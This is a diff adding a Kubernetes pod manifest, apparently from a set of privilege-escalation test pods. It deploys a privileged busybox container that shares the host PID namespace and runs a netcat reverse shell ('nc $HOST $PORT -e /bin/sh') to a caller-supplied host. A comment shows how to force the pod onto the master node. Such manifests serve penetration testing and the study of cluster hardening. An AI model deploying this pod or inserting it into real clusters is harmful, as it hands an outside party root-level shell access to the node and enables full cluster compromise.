@@ -1,0 +1,24 @@
+###########################################################
+## Deploy: kubectl -n [namespace] apply -f pod-priv-and-hostpid.yaml 
+## Access: kubectl -n [namespace] exec -it pod-priv-and-hostpid -- bash
+## Remove: kubectl -n [namespace] delete -f pod-priv-and-hostpid.yaml
+###########################################################
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod-priv-and-hostpid
+  labels: 
+    app: priv-and-hostpid
+spec:
+  hostPID: true
+  containers:
+  - name: priv-and-hostpid
+    image: busybox
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
+
+    securityContext:
+      privileged: true
+  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
+  #nodeName: k8s-master
+  restartPolicy: Always
